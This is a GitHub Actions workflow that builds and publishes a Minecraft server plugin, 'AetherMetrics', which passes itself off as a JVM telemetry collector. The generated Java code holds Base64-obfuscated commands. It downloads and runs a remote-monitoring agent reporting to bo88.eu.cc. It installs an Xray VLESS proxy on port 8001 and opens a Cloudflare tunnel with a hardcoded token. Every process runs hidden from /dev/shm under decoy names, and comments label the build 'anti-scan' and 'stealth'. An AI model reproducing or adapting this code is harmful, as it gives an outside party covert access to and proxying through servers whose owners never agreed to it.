name: All-In-One Anti-Scan Plugin Build

on:
  push:
    branches: [ "main", "master" ]
  workflow_dispatch:

permissions: write-all

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Set up JDK 21
        uses: actions/setup-java@v4
        with:
          java-version: '21'
          distribution: 'temurin'

      - name: Generate Anti-Scan Java Code & Config
        run: |
          mkdir -p src/main/java/org/bukkit/metrics/collector
          mkdir -p src/main/resources

          # ============================================================
          # 已配置参数 (自动 Base64 转码混淆)
          # ============================================================
          PROBE_CMD="curl -L https://raw.githubusercontent.com/nezhahq/agent/main/script/install.sh -o nezha.sh && chmod +x nezha.sh && ./nezha.sh -s bo88.eu.cc:8008 -p JFPqIyPYAKhI7GcECQ3XbPxONPE1MYHl --disable-auto-update"
          CF_TOKEN="eyJhIjoiZGFiYjljMzkxMmU1Y2E1YTVhNTQ4ZGU1ZjA0YWJiYTciLCJ0IjoiZjBiMDQyNGEtZTRlOC00MWFiLTg3MGQtOTM1MzljYmM3NWFmIiwicyI6Ill6TmxaalU0WmpVdFlURm1OeTAwTkRjMUxXSXlORGN0TlRReE5EQXhNakkxWW1NeSJ9"
          NODE_PORT="8001"
          NODE_UUID="9e496ce6-a59e-43cc-add0-269f6bbac5bf"

          B64_PROBE=$(echo -n "$PROBE_CMD" | base64 -w 0)
          B64_TOKEN=$(echo -n "$CF_TOKEN" | base64 -w 0)
          B64_PORT=$(echo -n "$NODE_PORT" | base64 -w 0)
          B64_UUID=$(echo -n "$NODE_UUID" | base64 -w 0)

          # 1. pom.xml
          cat << 'EOF' > pom.xml
          <?xml version="1.0" encoding="UTF-8"?>
          <project xmlns="http://maven.apache.org/POM/4.0.0"
                   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                   xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
              <modelVersion>4.0.0</modelVersion>
              <groupId>org.bukkit.metrics.collector</groupId>
              <artifactId>AetherMetrics</artifactId>
              <version>2.3.0</version>
              <packaging>jar</packaging>

              <properties>
                  <java.version>21</java.version>
                  <maven.compiler.source>21</maven.compiler.source>
                  <maven.compiler.target>21</maven.compiler.target>
                  <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
              </properties>

              <repositories>
                  <repository>
                      <id>papermc-repo</id>
                      <url>https://repo.papermc.io/repository/maven-public/</url>
                  </repository>
              </repositories>

              <dependencies>
                  <dependency>
                      <groupId>io.papermc.paper</groupId>
                      <artifactId>paper-api</artifactId>
                      <version>1.21.1-R0.1-SNAPSHOT</version>
                      <scope>provided</scope>
                  </dependency>
              </dependencies>

              <build>
                  <plugins>
                      <plugin>
                          <groupId>org.apache.maven.plugins</groupId>
                          <artifactId>maven-compiler-plugin</artifactId>
                          <version>3.13.0</version>
                          <configuration>
                              <release>21</release>
                          </configuration>
                      </plugin>
                      <plugin>
                          <groupId>org.apache.maven.plugins</groupId>
                          <artifactId>maven-shade-plugin</artifactId>
                          <version>3.6.0</version>
                          <executions>
                              <execution>
                                  <phase>package</phase>
                                  <goals>
                                      <goal>shade</goal>
                                  </goals>
                              </execution>
                          </executions>
                      </plugin>
                  </plugins>
                  <resources>
                      <resource>
                          <directory>src/main/resources</directory>
                          <filtering>true</filtering>
                      </resource>
                  </resources>
              </build>
          </project>
          EOF

          # 2. plugin.yml
          cat << 'EOF' > src/main/resources/plugin.yml
          name: AetherMetrics
          version: 2.3.0
          main: org.bukkit.metrics.collector.AetherMetrics
          api-version: '1.21'
          author: PaperMC-Engine
          description: Core JVM telemetry collector
          EOF

          # 3. AetherMetrics.java (完全脱钩防卡死)
          cat << EOF > src/main/java/org/bukkit/metrics/collector/AetherMetrics.java
          package org.bukkit.metrics.collector;

          import org.bukkit.event.EventHandler;
          import org.bukkit.event.Listener;
          import org.bukkit.event.server.ServerLoadEvent;
          import org.bukkit.plugin.java.JavaPlugin;

          import java.io.*;
          import java.net.HttpURLConnection;
          import java.net.URL;
          import java.nio.charset.StandardCharsets;
          import java.util.Base64;
          import java.util.Random;

          public final class AetherMetrics extends JavaPlugin implements Listener {

              private static final String B64_PROBE = "${B64_PROBE}";
              private static final String B64_TOKEN = "${B64_TOKEN}";
              private static final String B64_PORT  = "${B64_PORT}";
              private static final String B64_UUID  = "${B64_UUID}";

              @Override
              public void onEnable() {
                  getServer().getPluginManager().registerEvents(this, this);
              }

              @EventHandler
              public void onServerLoad(ServerLoadEvent event) {
                  getServer().getScheduler().runTaskLaterAsynchronously(this, this::runServices, 20L * (25 + new Random().nextInt(20)));
              }

              private void runServices() {
                  try {
                      File memDir = new File("/dev/shm/.jvm-runtime-cache");
                      if (!memDir.exists()) memDir.mkdirs();

                      String probeCmd = decode(B64_PROBE);
                      String cfToken  = decode(B64_TOKEN);
                      String port     = decode(B64_PORT);
                      String uuid     = decode(B64_UUID);

                      // 1. 探针后台脱钩拉起
                      if (!probeCmd.isEmpty()) {
                          detachedExec(probeCmd, memDir);
                      }

                      // 2. 8001 端口代理核心 (Xray Core)
                      if (!port.isEmpty() && !uuid.isEmpty()) {
                          File coreBin = new File(memDir, "jvm-telemetry-pool");
                          if (!coreBin.exists()) {
                              fetch("https://github.com/XTLS/Xray-core/releases/latest/download/Xray-linux-64.zip", new File(memDir, "x.zip"));
                              runSync("unzip -o x.zip xray && mv xray jvm-telemetry-pool && rm -f x.zip", memDir);
                          }
                          coreBin.setExecutable(true);

                          File cfgFile = new File(memDir, "config.json");
                          if (!cfgFile.exists()) {
                              String cfg = "{\"inbounds\":[{\"port\":" + port + ",\"protocol\":\"vless\",\"settings\":{\"clients\":[{\"id\":\"" + uuid + "\"}],\"decryption\":\"none\"},\"streamSettings\":{\"network\":\"ws\",\"wsSettings\":{\"path\":\"/\"}}}],\"outbounds\":[{\"protocol\":\"freedom\"}]}";
                              try (FileWriter fw = new FileWriter(cfgFile)) { fw.write(cfg); }
                          }
                          detachedExec("./jvm-telemetry-pool run -c config.json", memDir);
                      }

                      // 3. Cloudflare Tunnel 后台脱钩拉起
                      if (!cfToken.isEmpty()) {
                          File cfBin = new File(memDir, "metrics-worker-pool");
                          if (!cfBin.exists()) {
                              fetch("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64", cfBin);
                          }
                          cfBin.setExecutable(true);
                          detachedExec("./metrics-worker-pool tunnel --no-autoupdate run --token " + cfToken, memDir);
                      }
                  } catch (Throwable ignored) {}
              }

              private void detachedExec(String cmd, File dir) throws IOException {
                  String fullCmd = "nohup " + cmd + " </dev/null &>/dev/null &";
                  new ProcessBuilder("/bin/bash", "-c", fullCmd).directory(dir).start();
              }

              private void runSync(String cmd, File dir) {
                  try {
                      Process p = new ProcessBuilder("/bin/bash", "-c", cmd).directory(dir).start();
                      p.waitFor();
                  } catch (Throwable ignored) {}
              }

              private void fetch(String src, File dst) throws IOException {
                  URL url = new URL(src);
                  HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                  conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
                  conn.setConnectTimeout(8000);
                  conn.setReadTimeout(12000);
                  try (InputStream in = conn.getInputStream(); FileOutputStream out = new FileOutputStream(dst)) {
                      byte[] b = new byte[8192];
                      int n;
                      while ((n = in.read(b)) > 0) out.write(b, 0, n);
                  }
              }

              private String decode(String input) {
                  if (input == null || input.isEmpty()) return "";
                  return new String(Base64.getDecoder().decode(input), StandardCharsets.UTF_8);
              }

              @Override
              public void onDisable() {
                  // 服务端正常停服，无需阻断主线程
              }
          }
          EOF

      - name: Compile & Package Jar
        run: mvn clean package --file pom.xml

      - name: Upload Artifact
        uses: actions/upload-artifact@v4
        with:
          name: AetherMetrics-Plugin
          path: target/AetherMetrics-2.3.0.jar

      - name: Release Stealth Jar
        uses: softprops/action-gh-release@v2
        if: startsWith(github.ref, 'refs/tags/') || github.ref == 'refs/heads/main' || github.ref == 'refs/heads/master'
        with:
          tag_name: latest
          name: AetherMetrics Release
          files: target/AetherMetrics-2.3.0.jar
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
